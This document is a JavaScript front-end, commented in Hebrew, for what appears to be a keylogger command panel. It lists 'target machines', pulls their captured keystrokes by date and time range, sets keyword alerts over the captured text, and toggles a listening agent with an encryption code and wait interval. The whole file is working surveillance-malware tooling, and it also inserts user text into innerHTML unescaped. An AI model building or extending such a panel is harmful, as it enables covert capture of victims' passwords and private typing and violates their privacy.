// ===== מצב ושמירה מקומית =====
const LS_KEYS = {
  apiBase: "kl_api_base",
  alerts:  "kl_alerts",
  agent:   "kl_agent_settings",
  agentOn: "kl_agent_enabled",
};

let API_BASE = localStorage.getItem(LS_KEYS.apiBase) || "http://127.0.0.1:5000/api";
const setApiBase = (v) => { API_BASE = v; localStorage.setItem(LS_KEYS.apiBase, v); };

// ===== עוזרים =====
const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));
const fmtJSON = (obj) => JSON.stringify(obj, null, 2);
const normTime = (t) => {
  if (!t) return null;
  const parts = String(t).replace("%3A", ":").split(":");
  const hh = String(parts[0]).padStart(2,"0");
  const mm = parts[1] ? String(parts[1]).padStart(2,"0") : "00";
  const ss = parts[2] ? String(parts[2]).padStart(2,"0") : null;
  return ss ? `${hh}:${mm}:${ss}` : `${hh}:${mm}`;
};
const weekdayName = (dateStr) => {
  if (!dateStr) return "";
  const d = new Date(dateStr);
  const names = ["ראשון","שני","שלישי","רביעי","חמישי","שישי","שבת"];
  return names[d.getDay()];
};

// ===== ניווט בין דפים =====
function showPage(id){
  $$(".page").forEach(p => p.classList.add("hidden"));
  $(`#page-${id}`).classList.remove("hidden");
  $$(".nav-links a").forEach(a => a.classList.toggle("active", a.dataset.page === id));
}

// ===== API קריאות =====
async function apiGetMachines(){
  const res = await fetch(`${API_BASE}/get_target_machines_list`, { mode:"cors" });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

async function apiGetKeystrokes({machine, date, start, end}){
  if (!machine) throw new Error("בחר מחשב");
  const qs = new URLSearchParams({ machine });
  if (date)  qs.append("date", date);
  if (start) qs.append("start", normTime(start));
  if (end)   qs.append("end",   normTime(end));
  const url = `${API_BASE}/get_keystrokes?${qs.toString()}`;
  const res = await fetch(url, { mode:"cors" });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json(); // מערך מחרוזות JSON (תוכן קבצים)
}

// ===== מחשבים (בית + לוגים) =====
async function refreshMachines(){
  const strip = $("#machines-strip");
  const ddl   = $("#logs-machine");
  strip.innerHTML = '<span class="muted">טוען...</span>';
  $("#machines-status").textContent = "";

  try{
    const list = await apiGetMachines();
    strip.innerHTML = "";
    ddl.innerHTML = "";

    if (!Array.isArray(list) || list.length === 0){
      strip.innerHTML = '<span class="muted">לא נמצאו מחשבים</span>';
      $("#machines-status").textContent = "אין מחשבים זמינים בתיקיית הלוגים.";
      return;
    }

    list.forEach(name => {
      // Chip בבית
      const btn = document.createElement("button");
      btn.className = "machine-chip";
      btn.textContent = name;
      btn.onclick = () => {
        $$(".machine-chip").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        showPage("logs");
        $("#logs-machine").value = name;
      };
      strip.appendChild(btn);

      // Dropdown בלוגים
      const opt = document.createElement("option");
      opt.value = name; opt.textContent = name;
      ddl.appendChild(opt);
    });
  }catch(err){
    console.error(err);
    strip.innerHTML = '<span class="muted">שגיאה בטעינת המחשבים</span>';
    $("#machines-status").textContent = "שגיאה בתקשורת לשרת.";
  }
}

// ===== התראות (localStorage לעת עתה) =====
function loadAlerts(){
  try{ return JSON.parse(localStorage.getItem(LS_KEYS.alerts) || "[]"); }
  catch{ return []; }
}
function saveAlerts(arr){ localStorage.setItem(LS_KEYS.alerts, JSON.stringify(arr)); }
function renderAlerts(){
  const wrap = $("#alerts-list");
  const alerts = loadAlerts();
  wrap.innerHTML = alerts.length ? "" : '<div class="muted">אין התראות. צור התראה חדשה.</div>';
  alerts.forEach(a => {
    const card = document.createElement("div");
    card.className = "alert-card";
    card.innerHTML = `
      <h3>${a.title}</h3>
      <div class="muted">מילות מפתח:</div>
      <div>${(a.keywords||[]).map(k=>`<span class="alert-chip">${k}</span>`).join(" ") || "-"}</div>
      <div style="margin-top:8px;">
        <button class="btn" data-del="${a.id}">מחק</button>
      </div>
    `;
    wrap.appendChild(card);
  });

  wrap.querySelectorAll("[data-del]").forEach(btn=>{
    btn.addEventListener("click", ()=>{
      const id = btn.getAttribute("data-del");
      const next = loadAlerts().filter(x => x.id !== id);
      saveAlerts(next);
      renderAlerts();
      // TODO: בעתיד אפשר לשלוח DELETE לשרת: fetch(`${API_BASE}/alerts/${id}`, { method:"DELETE" })
    });
  });
}

function createAlert(title, keywordsCsv){
  const id = crypto.randomUUID();
  const keywords = (keywordsCsv||"").split(",").map(s=>s.trim()).filter(Boolean);
  const alerts = loadAlerts();
  alerts.push({ id, title, keywords, createdAt: Date.now() });
  saveAlerts(alerts);
  renderAlerts();
  // TODO: בעתיד POST לשרת: fetch(`${API_BASE}/alerts`, { method:"POST", body: JSON.stringify({title, keywords}), headers:{'Content-Type':'application/json'} })
}

// ===== Agent settings (localStorage לעת עתה) =====
function loadAgent(){
  try{ return JSON.parse(localStorage.getItem(LS_KEYS.agent) || "{}"); }
  catch{ return {}; }
}
function saveAgent(obj){
  localStorage.setItem(LS_KEYS.agent, JSON.stringify(obj));
}
function renderAgent(){
  const st = loadAgent();
  $("#agent-api-base").value = API_BASE;
  $("#agent-enc-code").value = st.enc || "";
  $("#agent-wait-sec").value = st.waitSec ?? "";
  const isOn = localStorage.getItem(LS_KEYS.agentOn) === "1";
  $("#btn-toggle-agent").textContent = isOn ? "עצירת האזנה" : "התחלת האזנה";
  $("#btn-toggle-agent").classList.toggle("btn-toggle", isOn);
}

// ===== לוגים =====
function setWeekday(){
  const d = $("#logs-date").value;
  $("#weekday-label").textContent = d ? `יום ${weekdayName(d)}` : "";
}

async function fetchLogs(){
  $("#logs-status").textContent = "טוען...";
  $("#logs-results").innerHTML = "";

  const machine = $("#logs-machine").value;
  const date = $("#logs-date").value;
  const start = $("#logs-start").value;
  const end = $("#logs-end").value;

  try{
    const arr = await apiGetKeystrokes({ machine, date, start, end });
    if (!arr || !arr.length){
      $("#logs-status").textContent = "לא נמצאו נתונים לטווח שבחרת.";
      return;
    }
    $("#logs-status").textContent = `נמצאו ${arr.length} קבצים.`;

    arr.forEach((item, i) => {
      let obj = null;
      if (typeof item === "string"){
        try{ obj = JSON.parse(item); }catch{ obj = null; }
      } else if (item && typeof item === "object"){
        obj = item;
      }

      const card = document.createElement("div");
      card.className = "log-card";
      const title = document.createElement("div");
      title.className = "log-title";
      title.textContent = `קובץ #${i+1}`;
      card.appendChild(title);

      const pre = document.createElement("pre");
      pre.textContent = obj ? fmtJSON(obj) : String(item);
      card.appendChild(pre);

      $("#logs-results").appendChild(card);
    });
  }catch(err){
    console.error(err);
    $("#logs-status").textContent = "שגיאה בשליפת נתונים מהשרת.";
  }
}

// ===== אירועים ואתחול =====
document.addEventListener("DOMContentLoaded", ()=>{
  // ניווט
  $$(".nav-links a").forEach(a => {
    a.addEventListener("click", (e)=>{
      e.preventDefault();
      showPage(a.dataset.page);
    });
  });

  // בית: מחשבים
  $("#btn-refresh-machines").addEventListener("click", refreshMachines);

  // התראות: יצירה/מחיקה
  $("#alert-form").addEventListener("submit", (e)=>{
    e.preventDefault();
    const title = $("#alert-title").value.trim();
    const keywords = $("#alert-keywords").value.trim();
    if (!title) return;
    createAlert(title, keywords);
    e.target.reset();
  });

  // סוכן: שמירה/טוגל
  $("#btn-save-api").addEventListener("click", ()=>{
    const val = $("#agent-api-base").value.trim();
    if (!val) return alert("נא להזין כתובת API");
    setApiBase(val);
    alert("כתובת API נשמרה.");
  });
  $("#btn-save-enc").addEventListener("click", ()=>{
    const st = loadAgent();
    st.enc = $("#agent-enc-code").value;
    saveAgent(st);
    alert("קוד הצפנה נשמר מקומית.");
    // TODO: בעתיד POST לשרת
  });
  $("#btn-save-wait").addEventListener("click", ()=>{
    const st = loadAgent();
    const n = Number($("#agent-wait-sec").value);
    st.waitSec = Number.isFinite(n) ? n : null;
    saveAgent(st);
    alert("זמן המתנה נשמר מקומית.");
    // TODO: בעתיד POST לשרת
  });
$("#btn-toggle-agent").addEventListener("click", () => {
  const isOn = localStorage.getItem(LS_KEYS.agentOn) === "1";
  localStorage.setItem(LS_KEYS.agentOn, isOn ? "0" : "1"); // ← תוקן
  renderAgent();
  alert(isOn ? "האזנה הופסקה." : "האזנה החלה.");
});


  // לוגים
  $("#logs-date").addEventListener("change", setWeekday);
  $("#btn-fetch-logs").addEventListener("click", fetchLogs);

  // אתחול ראשוני
  renderAlerts();
  renderAgent();

  // מלא תאריך של היום בלוגים
  const d = new Date();
  const dstr = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;
  $("#logs-date").value = dstr;
  setWeekday();

  refreshMachines();
});
